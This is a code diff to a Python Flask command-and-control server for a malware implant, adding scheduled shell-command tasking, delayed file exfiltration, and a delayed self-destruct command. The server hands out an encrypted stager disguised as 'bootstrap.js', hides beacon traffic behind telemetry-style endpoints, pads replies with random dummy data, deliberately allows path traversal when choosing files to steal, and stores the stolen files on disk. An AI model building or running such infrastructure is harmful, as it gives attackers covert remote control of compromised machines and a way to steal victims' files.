@@ -1,13 +1,14 @@
 """Command and Control HTTP server for communicating with implant"""
 
-import base64
+from base64 import b64encode, b64decode
 import os
 import json
 import time
+from random import randbytes, randrange
+from datetime import datetime, timezone
 
-from flask import Flask, request, jsonify, Response, send_file
+from flask import Flask, request, jsonify, Response
 from werkzeug.utils import secure_filename
-from Crypto.Cipher import AES
 from cryptography.hazmat.primitives.asymmetric import x25519
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.primitives import hashes
@@ -20,12 +21,13 @@ PORT = 8443
 CERT_FOLDER = "cert"
 UPLOAD_FOLDER = "uploads"
 PAYLOAD_FOLDER = "dist"
-tasks = []
-results = []
+PAYLOAD_NAME = "d-ISkvI"
 STAGER_ENDPOINT = "/cdn/bootstrap.js"
 BEACON_ENDPOINT = "/api/telemetry"
 RESULTS_ENDPOINT = "/api/updates"
 FILE_ENDPOINT = "/api/upload"
+tasks = []
+results = []
 derived_key = None
 
 
@@ -37,12 +39,12 @@ def encrypt_data(aes_key: bytes, plaintext: bytes | str) -> bytes:
     aesgcm = AESGCM(aes_key)
     nonce = os.urandom(12)
     ciphertext = aesgcm.encrypt(nonce, plaintext, None)
-    return base64.b64encode(nonce + ciphertext)
+    return b64encode(nonce + ciphertext)
 
 
 def decrypt_data(aes_key: bytes, b64_data: bytes, decode: bool = True):
     """Decrypt data using AES-256-GCM with nonce and decode with base64"""
-    data = base64.b64decode(b64_data)
+    data = b64decode(b64_data)
     nonce = data[:12]
     ciphertext_and_tag = data[12:]
 
@@ -61,7 +63,7 @@ def exchange_keys(client_public_bytes: bytes) -> bytes:
     -   These packets are encrypted with pre-shared key
     -   If client can't connect to server, it will keep retrying with new key pairs
     """
-    print("[*] First beacon received from client, exchanging keys...")
+    print("[*] First beacon received from client, exchanging keys")
     # get client public key
     client_public_key = x25519.X25519PublicKey.from_public_bytes(client_public_bytes)
 
@@ -86,7 +88,7 @@ def exchange_keys(client_public_bytes: bytes) -> bytes:
     ).derive(shared_secret)
 
     # save key to disk for backup
-    print(f"[*] Saving to '{CERT_FOLDER}/derived.key'...")
+    print(f"[*] Saving to '{CERT_FOLDER}/derived.key'")
     with open(os.path.join(CERT_FOLDER, "derived.key"), "wb") as f:
         f.write(shared_key)
 
@@ -99,15 +101,15 @@ def restore_key() -> bytes:
     key. This would effectively prevent it from communicating with the implant which expects
     encrypted messages, even for stopping the implant or getting a new key since only the client can
     initiate key exchange. If this happens, we attempt to recover it from the backup saved in
-    "cert/derived.key"
+    "CERT_FOLDER/derived.key"
     """
     # create "derived.key" if it doesn't exist
-    if not os.path.exists("cert/derived.key"):
-        print("[!] 'cert/derived.key' not found, creating empty file...")
+    if not os.path.exists(os.path.join(CERT_FOLDER, "derived.key")):
+        print(f"[!] '{CERT_FOLDER}/derived.key' not found, creating empty file")
         with open(os.path.join(CERT_FOLDER, "derived.key"), "wb") as f:
             return None
 
-    print("[*] Restoring derived key from last session...")
+    print("[*] Restoring derived key from last session")
     with open(os.path.join(CERT_FOLDER, "derived.key"), "rb") as f:
         shared_key = f.read()
     return shared_key
@@ -116,15 +118,15 @@ def restore_key() -> bytes:
 @app.route(STAGER_ENDPOINT)
 def send_encrypted_payload():
     """
-    Attacker calls this from the target to download the encrypted and b64 encoded payload
-    Use pycryptodome here since target has it installed
+    Attacker calls this from the target to download the encrypted and b64-encoded payload
     """
-    print("[*] stager endpoint called, sending encrypted payload...")
+    print("[*] stager endpoint called, sending encrypted payload")
     # encrypt payload before sending if it doesnt exist
     encrypted_payload_path = os.path.join(PAYLOAD_FOLDER, "encrypted_payload")
-    if not os.path.exists(encrypted_payload_path):
+    IGNORE_CACHED = True
+    if not os.path.exists(encrypted_payload_path) or IGNORE_CACHED:
         encrypted_payload = None
-        with open(os.path.join(PAYLOAD_FOLDER, "good_payload"), "rb") as f:
+        with open(os.path.join(PAYLOAD_FOLDER, PAYLOAD_NAME), "rb") as f:
             pre_shared_key = bytes.fromhex(
                 "65b53ecaba31f22e75e92d9ed95d1bebd233438d72ce2f9f2ac954ca197a679f"
             )
@@ -140,9 +142,7 @@ def send_encrypted_payload():
         return Response(
             encrypted_payload,
             mimetype="application/octet-stream",
-            headers={
-                "Content-Disposition": "attachment; filename=bee-movie.mp4"
-            },
+            headers={"Content-Disposition": "attachment; filename=bootstrap.js"},
         )
 
 
@@ -174,15 +174,74 @@ def beacon():
 def task():
     """
     Operator calls this endpoint with "cmd" (str) param to add tasks (shell cmds)
+
+    For scheduling, there are two (exclusive, optional) choices:
+
+    1. The operator can specify an absolute time at which the task should run with "time" (str)
+       param. This takes the format "%Y-%m-%d %H:%M:%S" and gets converted to a unix timestamp
+       before sending to the implant. If the date has already passed, then it runs immediately
+
+    2. Or, the operator can specify when to run the task after a delay with "delay" (str) param that
+       takes format "dd:hh:mm:ss", but there may be any number of units (e.g. "0:10:200:3000" or
+       ":::5" are both valid). This gets converted into a seconds duration before sending to the
+       implant. Note that the delay starts when the implant receives the command, not when the
+       operator sends it
+
+    If both scheduling options are given, the absolute time takes precedence. If none are given,
+    then the task runs immediately when the implant receives it.
+
     Implant receives tasks when pinging BEACON_ENDPOINT
     Implant uploads results to RESULTS_ENDPOINT
     """
     data = request.json
-    print("[*] TASKS\n", data)
-    command: str = data.get("cmd")
+    print("[*] TASKS:", data)
+    cmd: str = data.get("cmd")
+    abs_time_local: str = data.get("time")
+    duration: str = data.get("delay")
+    timestamp = None
 
-    tasks.append(command)
-    return jsonify({"status": "task added"})
+    if not cmd:
+        return "[!] missing 'cmd' param\n", 400
+    if abs_time_local:
+        timestamp = (
+            datetime.strptime(abs_time_local, "%Y-%m-%d %H:%M:%S")
+            .astimezone(timezone.utc)
+            .timestamp()
+        )
+    if not duration:
+        duration = "00:00:00:00"
+
+    delay_seconds = parse_duration(duration)
+    if delay_seconds is None:
+        return "[!] delay must be in dd:hh:mm:ss format, task aborted\n", 400
+
+    if timestamp:
+        add_task(cmd, abs_time=timestamp)
+        return f"[*] added task `{cmd}` to run at {timestamp}"
+
+    add_task(cmd, delay_seconds=delay_seconds)
+    return f"[*] added task `{cmd}` with {delay_seconds} second delay"
+
+
+def add_task(cmd: str, abs_time: float = 0, delay_seconds: int = 0):
+    """Adds scheduled task as a dict with "cmd" and "delay" fields"""
+    scheduled_task = {"cmd": cmd, "delay": delay_seconds}
+    if abs_time:
+        scheduled_task["time"] = abs_time
+    print(scheduled_task)
+    tasks.append(scheduled_task)
+
+
+def parse_duration(delay: str) -> int | None:
+    """Converts delay duration string to seconds"""
+    # separate time units and convert ":::" to "0:0:0:0"
+    parts = [int(p) if p else 0 for p in delay.strip().split(":")]
+    if len(parts) != 4:
+        return None
+
+    # convert to seconds
+    days, hours, minutes, seconds = map(int, parts)
+    return days * 86400 + hours * 3600 + minutes * 60 + seconds
 
 
 @app.route(RESULTS_ENDPOINT, methods=["POST"])
@@ -191,21 +250,28 @@ def task_result():
     enc = request.get_data().decode()
     plain = decrypt_data(derived_key, enc)
     json_data = json.loads(plain)
-    print("[*] RESULT\n", json_data)
+    print("[*] RESULT", json_data)
 
     result = json_data.get("result")
     results.append(result)
-    return "", 200
+
+    # return dummy data
+    return encrypt_data(derived_key, randbytes(randrange(128, 256)))
 
 
 @app.route("/exfil", methods=["POST"])
 def queue_exfil():
     """
     Operator calls this with "files" (list[str]) param to tell implant which files to exfiltrate
+
+    The operator can optionally specify when to run the task at a specific time with "time" (str)
+    param or after a delay with "delay" (str) param. See task() for details
+
     Implant will respond to FILE_ENDPOINT
     """
     data = request.json
     files = data.get("files")
+    delay = data.get("delay")
 
     # allow inputting single files
     if isinstance(files, str):
@@ -214,13 +280,19 @@ def queue_exfil():
     if (not files or not isinstance(files, list)) or (
         files and not isinstance(files[0], str)
     ):
-        return "[!] Request must include 'files' param as list[str]", 400
+        return "[!] Request must include 'files' param as list[str]\n", 400
+
+    if not delay:
+        delay = "00:00:00:00"
+    delay_seconds = parse_duration(delay)
+    if delay_seconds is None:
+        return "[!] delay must be in dd:hh:mm:ss format, file exfil aborted\n", 400
 
     for filename in files:
         # don't secure filename because we want file traversal
-        tasks.append(f"FILE {filename}")
+        add_task(f"FILE {filename}", delay_seconds)
 
-    return jsonify({"status": f"{len(files)} files added"})
+    return f"[*] {len(files)} files added"
 
 
 @app.route(FILE_ENDPOINT, methods=["POST"])
@@ -229,27 +301,42 @@ def recv_file():
     Implant uses this endpoint to upload encrypted files in "files" field
     Decrypted files are uploaded in UPLOAD_FOLDER with a timestamp appended
     """
-    if "file" not in request.files:
-        return "", 400
-
-    enc_file = request.files.get("file")  # flask FileStorage object
     # decrypt file
+    enc_file = request.files.get("file")  # flask FileStorage object
     file_bytes = decrypt_data(derived_key, enc_file.read(), False)
 
     # upload to UPLOAD_FOLDER/filename_<timestamp>
     filename = decrypt_data(derived_key, enc_file.filename)
     sec_filename = secure_filename(filename + f"_{int(time.time())}")
+
+    if not os.path.exists(UPLOAD_FOLDER):
+        os.mkdir(UPLOAD_FOLDER)
     with open(os.path.join(UPLOAD_FOLDER, sec_filename), "wb") as f:
         f.write(file_bytes)
-    return "", 200
+
+    # return dummy data
+    return encrypt_data(derived_key, randbytes(randrange(32, 64)))
 
 
 @app.route("/destroy", methods=["POST"])
 def destroy():
-    """Operator calls this to replace all tasks with final "destroy" task"""
-    tasks.clear()
-    tasks.append("DESTROY")
-    return jsonify({"status": "sent destroy task"})
+    """
+    Operator calls this to append final "destroy" task
+
+    The operator can optionally specify when to run the task at a specific time with "time" (str)
+    param or after a delay with "delay" (str) param. See task() for details
+    """
+    data = request.json
+    delay = data.get("delay")
+
+    if not delay:
+        delay = "00:00:00:00"
+    delay_seconds = parse_duration(delay)
+    if delay_seconds is None:
+        return "[!] delay must be in dd:hh:mm:ss format, destroy aborted\n", 400
+
+    add_task("DESTROY", delay_seconds)
+    return f"[*] sent destroy task with {delay_seconds} second delay"
 
 
 @app.route("/view")
